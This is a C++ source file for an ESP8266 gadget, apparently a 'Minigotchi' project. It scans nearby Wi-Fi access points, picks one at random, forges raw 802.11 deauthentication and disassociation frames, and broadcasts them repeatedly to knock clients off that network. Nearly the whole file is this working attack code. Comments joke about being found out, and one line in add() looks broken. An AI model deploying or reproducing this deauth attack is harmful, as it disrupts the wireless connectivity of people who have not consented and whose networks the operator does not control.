/**
 * deauth.cpp: handles the deauth of a local AP
*/

#include "deauth.h"

/** developer note:
 *
 * the deauth frame is defined here.
 * this is a raw frame(layer 2)
 * man i hate networking
 *
*/

// default values before we start
bool Deauth::running = false;
std::vector<String> Deauth::whitelist = {};
String Deauth::randomAP = "";
int Deauth::randomIndex;

/** developer note:
 * 
 * instead of using the deauth frame normally, we append information to the deauth frame and dynamically write info to the frame
 * 
*/

uint8_t Deauth::deauthTemp[26] = {
    /*  0 - 1  */ 0xC0, 0x00,                         // Type, subtype: c0 => deauth, a0 => disassociate
    /*  2 - 3  */ 0x00, 0x00,                         // Duration (handled by the SDK)
    /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Reciever MAC (To)
    /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // Source MAC (From)
    /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID MAC (From)
    /* 22 - 23 */ 0x00, 0x00,                         // Fragment & squence number
    /* 24 - 25 */ 0x01, 0x00                          // Reason code (1 = unspecified reason)
};

uint8_t Deauth::deauthFrame[26];
uint8_t Deauth::disassociateFrame[26];
uint8_t Deauth::broadcastAddr[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

void Deauth::add(const std::string& bssids) {
    std::stringstream ss(bssids);
    std::string token;

    // seperate info and whitelist
    while (std::getline(ss, token, ',')) {
        // trim out whitespace
        token.erase(0, token.find_first_not_of(" \t\r\n"));
        token.erase(token.find_last_not_of(" \t\r\n") + 1);

        // add to whitelist
        Serial.print("('-') Adding ");
        Serial.print(token.c_str());
        Serial.println(" to the whitelist");
        Display::cleanDisplayFace("('-')");
        Display::attachSmallText("Adding " + (String) + " to the whitelist");
        whitelist.push_back(token.c_str());
    }
}

void Deauth::list() {
    for (const auto& bssid : Config::whitelist) {
        Deauth::add(bssid);
    }
}

bool Deauth::send(uint8_t* buf, uint16_t len, bool sys_seq) {
    // apparently will not work with 0 on regular, fixed on spacehuhn
    bool sent = wifi_send_pkt_freedom(buf, len, sys_seq) == 0;
    delay(102);

    return sent;
}

// check if this is a broadcast
// source: https://github.com/SpacehuhnTech/esp8266_deauther/blob/v2/esp8266_deauther/functions.h#L334
bool Deauth::broadcast(uint8_t* mac) {
    for (uint8_t i = 0; i < 6; i++) {
         if (mac[i] != broadcastAddr[i]) return false;
    }

    return true;
}

void Deauth::printMac(uint8_t* mac) {
    for (int i = 0; i < 6; i++) {
        Serial.print(mac[i], HEX);
        if (i < 5) {
            Serial.print(":");
        }
    }

    Serial.println();
}

String Deauth::printHidden(int network) {
    String hidden;
    bool check = WiFi.channel(network);

    if (check == 0) {
        hidden = "False";
    } else {
        hidden = "True";
    }

    return hidden;
}

String Deauth::printMacStr(uint8_t* mac) {
    String macStr = "";
    for (int i = 0; i < 6; i++) {
        if (mac[i] < 16) {
            macStr += "0"; // Add leading zero for single-digit hex values
        }
        macStr += String(mac[i], HEX);
        if (i < 5) {
            macStr += ":";
        }
    }
    return macStr;
}

void Deauth::select() {
    // cool animation
    for (int i = 0; i < 5; ++i) {
        Serial.println("(0-o) Scanning for APs.");
        Display::cleanDisplayFace("(0-o)");
        Display::attachSmallText("Scanning  for APs.");
        delay(250);
        Serial.println("(o-0) Scanning for APs..");
        Display::cleanDisplayFace("(o-0)");
        Display::attachSmallText("Scanning  for APs..");
        delay(250);
        Serial.println("(0-o) Scanning for APs...");
        Display::cleanDisplayFace("(0-o)");
        Display::attachSmallText("Scanning  for APs...");
        delay(250);
        Serial.println(" ");
        delay(250);
    }

    delay(250);

    // stop and scan
    Minigotchi::monStop();
    int apCount = WiFi.scanNetworks();

    if (apCount > 0) {
        Deauth::randomIndex = random(apCount);
        Deauth::randomAP = WiFi.SSID(Deauth::randomIndex);
    } else if (apCount < 0) {
        Serial.println("(;-;) I don't know what you did, but you screwed up!");
        Serial.println(" ");
        Display::cleanDisplayFace("(;-;)");
        Display::attachSmallText("You screwed up somehow!");
        delay(250);
    } else {
        // well ur fucked.
        Serial.println("(;-;) No access points found.");
        Serial.println(" ");
        Display::cleanDisplayFace("(;-;)");
        Display::attachSmallText("No access points found.");
        delay(250);
    }

    // check for ap in whitelist
    if (std::find(whitelist.begin(), whitelist.end(), randomAP) != whitelist.end()) {
        Serial.println("('-') Selected AP is in the whitelist. Skipping deauthentication...");
        Display::cleanDisplayFace("('-')");
        Display::attachSmallText("Selected AP is in the whitelist. Skipping deauthentication...");
        return;
    }
    Serial.print("('-') Selected random AP: ");
    Serial.println(randomAP.c_str());
    Serial.println(" ");
    Display::cleanDisplayFace("('-')");
    Display::attachSmallText("Selected random AP: " + (String) randomAP.c_str());
    delay(250);
        
    /** developer note:
     * 
     * here we will create the deauth frame using the header, 
     * as we find the AP in question we also generate the required information for it as well...
     * 
    */

    // clear out exisitng frame...
    std::fill(std::begin(Deauth::deauthFrame), std::end(Deauth::deauthFrame), 0);
    std::fill(std::begin(Deauth::disassociateFrame), std::end(Deauth::disassociateFrame), 0);

    // copy template
    std::copy(Deauth::deauthTemp, Deauth::deauthTemp + sizeof(Deauth::deauthTemp), Deauth::deauthFrame);
    std::copy(Deauth::deauthTemp, Deauth::deauthTemp + sizeof(Deauth::deauthTemp), Deauth::disassociateFrame);

    Deauth::deauthFrame[0] = 0xC0; // type
    Deauth::deauthFrame[1] = 0x00; // subtype
    Deauth::deauthFrame[2] = 0x00; // duration (SDK takes care of that)
    Deauth::deauthFrame[3] = 0x00; // duration (SDK takes care of that)

    Deauth::disassociateFrame[0] = 0xA0; // type
    Deauth::disassociateFrame[1] = 0x00; // subtype
    Deauth::disassociateFrame[2] = 0x00; // duration (SDK takes care of that)
    Deauth::disassociateFrame[3] = 0x00; // duration (SDK takes care of that)

    // bssid
    uint8_t* apBssid = WiFi.BSSID(Deauth::randomIndex);

    // set our mac address
    uint8_t mac[WL_MAC_ADDR_LENGTH];
    WiFi.macAddress(mac);

    /** developer note:
     * 
     * addr1: reciever addr
     * addr2: sender addr
     * addr3: filtering addr
     * 
    */

    // copy our mac(s) to header
    std::copy(Deauth::broadcastAddr, Deauth::broadcastAddr + sizeof(Deauth::broadcastAddr), Deauth::deauthFrame + 4);
    std::copy(apBssid, apBssid + sizeof(apBssid), Deauth::deauthFrame + 10);
    std::copy(apBssid, apBssid + sizeof(apBssid), Deauth::deauthFrame + 16);

    std::copy(Deauth::broadcastAddr, Deauth::broadcastAddr + sizeof(Deauth::broadcastAddr), Deauth::disassociateFrame + 4);
    std::copy(apBssid, apBssid + sizeof(apBssid), Deauth::disassociateFrame + 10);
    std::copy(apBssid, apBssid + sizeof(apBssid), Deauth::disassociateFrame + 16);

    if (!broadcast(Deauth::broadcastAddr)) {
        // build deauth
        Deauth::deauthFrame[0] = 0xC0; // type
        Deauth::deauthFrame[1] = 0x00; // subtype
        Deauth::deauthFrame[2] = 0x00; // duration (SDK takes care of that)
        Deauth::deauthFrame[3] = 0x00; // duration (SDK takes care of that)

        // reason
        Deauth::deauthFrame[24] = 0x01; // reason: unspecified

        std::copy(apBssid, apBssid + sizeof(apBssid), Deauth::deauthFrame + 4);
        std::copy(Deauth::broadcastAddr, Deauth::broadcastAddr + sizeof(Deauth::broadcastAddr), Deauth::deauthFrame + 10);
        std::copy(Deauth::broadcastAddr, Deauth::broadcastAddr + sizeof(Deauth::broadcastAddr), Deauth::deauthFrame + 16);

        // build disassocaition 
        Deauth::disassociateFrame[0] = 0xA0; // type
        Deauth::disassociateFrame[1] = 0x00; // subtype
        Deauth::disassociateFrame[2] = 0x00; // duration (SDK takes care of that)
        Deauth::disassociateFrame[3] = 0x00; // duration (SDK takes care of that)

        std::copy(apBssid, apBssid + sizeof(apBssid), Deauth::disassociateFrame + 4);
        std::copy(Deauth::broadcastAddr, Deauth::broadcastAddr + sizeof(Deauth::broadcastAddr), Deauth::disassociateFrame + 10);
        std::copy(Deauth::broadcastAddr, Deauth::broadcastAddr + sizeof(Deauth::broadcastAddr), Deauth::disassociateFrame + 16);
    }

    Serial.print("('-') Full AP SSID: ");
    Serial.println(WiFi.SSID(Deauth::randomIndex));
    Display::cleanDisplayFace("('-')");
    Display::attachSmallText("Full AP SSID: " + (String) WiFi.SSID(Deauth::randomIndex));  

    Serial.print("('-') AP Encryption: ");
    Serial.println(WiFi.encryptionType(Deauth::randomIndex));
    Display::cleanDisplayFace("('-')");
    Display::attachSmallText("AP Encryption: " + (String) WiFi.encryptionType(Deauth::randomIndex));  

    Serial.print("('-') AP RSSI: ");
    Serial.println(WiFi.RSSI(Deauth::randomIndex));
    Display::cleanDisplayFace("('-')");
    Display::attachSmallText("AP RSSI: " + (String) WiFi.RSSI(Deauth::randomIndex));

    Serial.print("('-') AP BSSID: ");
    printMac(apBssid);
    Display::cleanDisplayFace("('-')");
    Display::attachSmallText("AP BSSID: " + (String) Deauth::printMacStr(apBssid));    

    Serial.print("('-') AP Channel: ");
    Serial.println(WiFi.channel(Deauth::randomIndex));
    Display::cleanDisplayFace("('-')");
    Display::attachSmallText("AP Channel: " + (String) WiFi.channel(Deauth::randomIndex));

    Serial.print("('-') AP Hidden?: ");
    Serial.println(Deauth::printHidden(Deauth::randomIndex));
    Display::cleanDisplayFace("('-')");
    Display::attachSmallText("AP Hidden?: " + (String) Deauth::printHidden(Deauth::randomIndex));
    Serial.println(" ");
    delay(250);
}

void Deauth::deauth() {
    if (Config::deauth) {
       // select AP
        Deauth::select();

        if (randomAP.length() > 0) {
            Serial.println("(>-<) Starting deauthentication attack on the selected AP...");
            Serial.println(" ");
            Display::cleanDisplayFace("(>-<)");
            Display::attachSmallText("Begin deauth-attack on AP...");
            delay(250);
            // define the attack
            if (!running) {
                start();
            } else {
                Serial.println("('-') Attack is already running.");
                Serial.println(" ");
                Display::cleanDisplayFace("('-')");
                Display::attachSmallText(" Attack is already running.");
                delay(250);
            }
        } else {
            // ok why did you modify the deauth function? i literally told you to not do that...
            Serial.println("(X-X) No access point selected. Use select() first.");
            Serial.println("('-') Told you so!");
            Serial.println(" ");
            Display::cleanDisplayFace("(X-X)");
            Display::attachSmallText("No access point selected. Use select() first.");
            delay(250);
            Display::cleanDisplayFace("('-')");
            Display::attachSmallText("Told you so!");
            delay(250);
        }
    } else {
        // do nothing if deauthing is disabled
    }
}

void Deauth::start() {
    running = true;
    int deauthFrameSize = sizeof(deauthFrame);
    int disassociateFrameSize = sizeof(disassociateFrame);
    int packets = 0;
    unsigned long startTime = millis();

    // packet calculation
    int basePacketCount = 150;
    int rssi = WiFi.RSSI(Deauth::randomIndex);
    int numDevices = WiFi.softAPgetStationNum();

    int packetCount = basePacketCount + (numDevices * 10);
    if (rssi > -50) {
        packetCount /= 2;  // strong signal
    } else if (rssi < -80) {
        packetCount *= 2;  // weak signal
    }

    // send the deauth 150 times(ur cooked if they find out)
    for (int i = 0; i < packetCount; ++i) {
        if (Deauth::send(deauthFrame, deauthFrameSize, 0) || Deauth::send(disassociateFrame, disassociateFrameSize, 0)) {
            packets++;
            float pps = packets / (float)(millis() - startTime) * 1000;

            // show pps
            if (!isinf(pps)) {
                Serial.print("(>-<) Packets per second: ");
                Serial.print(pps);
                Serial.print(" pkt/s");
                Serial.println(" (AP:" + (String) randomAP.c_str() + ")");
                Display::cleanDisplayFace("(>-<)");
                Display::attachSmallText("Packets per second: " + (String) pps + " pkt/s" + "(AP:" + (String) randomAP.c_str() + ")"); 
            } 
        } else if (!Deauth::send(deauthFrame, deauthFrameSize, 0) || !Deauth::send(disassociateFrame, disassociateFrameSize, 0)) {
            Serial.println("(X-X) Both packets failed to send!");
            Display::cleanDisplayFace("(X-X)");
            Display::attachSmallText("Both packets failed to send!");
        } else if (!Deauth::send(deauthFrame, deauthFrameSize, 0) && Deauth::send(disassociateFrame, disassociateFrameSize, 0)) {
            Serial.println("(X-X) Deauthentication failed to send!");
            Display::cleanDisplayFace("(X-X)");
            Display::attachSmallText("Deauth failed to send!");
        } else if (Deauth::send(deauthFrame, deauthFrameSize, 0) && !Deauth::send(disassociateFrame, disassociateFrameSize, 0)) {
            Serial.println("(X-X) Disassociation failed to send!");
            Display::cleanDisplayFace("(X-X)");
            Display::attachSmallText("Disassoc failed to send!");
        } else {
            Serial.println("(X-X) Unable to calculate pkt/s!");
            Display::cleanDisplayFace("(X-X)");
            Display::attachSmallText("Unable to calculate pkt/s!");
        }
    }

    Serial.println(" ");
    Serial.println("(^-^) Attack finished!");
    Serial.println(" ");
    Display::cleanDisplayFace("(^-^)");
    Display::attachSmallText("Attack finished!");
    running = false;
}
